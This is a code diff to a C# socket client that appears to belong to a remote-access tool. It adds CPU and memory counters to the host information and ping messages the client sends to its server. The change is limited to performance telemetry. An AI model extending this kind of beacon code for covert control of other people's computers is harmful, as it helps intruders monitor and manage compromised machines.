@@ -22,7 +22,8 @@ namespace Client.Sockets
         private static object SendSync { get; set; }
         private static object EndSendSync { get; set; }
         public static bool Connected { get; set; }
-
+        public static PerformanceCounter theCPUCounter;
+        public static PerformanceCounter theMemCounter;
         public static void InitializeClient()
         {
             try
@@ -43,6 +44,9 @@ namespace Client.Sockets
                 MS = new MemoryStream();
                 SendSync = new object();
                 EndSendSync = new object();
+                theCPUCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+                theMemCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
+                theCPUCounter.NextValue();
                 BeginSend(SendInfo());
                 TimerCallback T = CheckServer;
                 Tick = new Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
@@ -80,6 +84,7 @@ namespace Client.Sockets
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
+            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)theCPUCounter.NextValue()}%   RAM {(int)theMemCounter.NextValue()}%";
             return msgpack.Encode2Bytes();
         }
 
@@ -193,7 +198,7 @@ namespace Client.Sockets
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Ping";
-            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
+            msgpack.ForcePathObject("Message").AsString = $"CPU {(int)theCPUCounter.NextValue()}%   RAM {(int)theMemCounter.NextValue()}%";
             BeginSend(msgpack.Encode2Bytes());
         }
     }
